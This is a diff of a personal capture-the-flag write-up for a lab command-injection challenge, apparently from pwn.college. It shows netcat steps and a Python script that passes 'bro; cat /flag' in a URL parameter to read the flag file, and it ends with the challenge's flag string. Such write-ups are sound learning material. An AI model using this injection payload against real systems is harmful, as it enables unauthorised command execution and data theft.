@@ -11,9 +11,9 @@ I WAY -> netcat
 -opened the terminal
 -ran: 'cat /challenge/server'
 found out the only endpoint available is /mission
-the server sends back the output of aguments that had been passed through the url
-by default it concatenates them to "ls -l {args}"
-the server expects an argument called target, in which assigns to it as default "/challenge" if no args had been provided
+the server sends back the command's output
+the command was built by concatenating "ls -l" + target's value from the url
+if no args were passed in the url, target's value as default is "/challenge"
 so the goal is to inject our crafted command as value of target in the url
 -ran: '/challenge/server'
 -ran: 'nc -v challenge.localhost 80'
@@ -22,10 +22,27 @@ so the goal is to inject our crafted command as value of target in the url
 -flag popped out
 
 II WAY -> python
-
+-clicked start
+-opened the terminal
+-ran: 'vim bro'
+-typed: '#!/usr/bin/env python3'
+        'import requests'
+        'from pwn import*'
+        'context.log_level = 'error''
+        'p = process("/challenge/server")'
+        'time.sleep(1)'
+        'url = "http://challenge.localhost:80/mission"
+        'params = {'
+                '"target" : "bro; cat /flag"'
+        '}'
+        'r = requests.get(url, params)'
+        'print(r.text)'
+-flag popped out
 
 ## 🧑🏾‍🏫 what this challenge teaches u
-
+the line arg = flask.request.args.get("target", "/challenge") declare a variable called arg and assigns to it target=/challenge by default
+in case no args were provided in the url
+otherwise, if in the url target has a value, arg will recieve it as target=VALUE
 
 ## 🏁 Flag  
 pwn.college{Q26HsV5ssAO0q4DFvGdGRPootrP.QX1YTN2wCO4IDOxEzW}
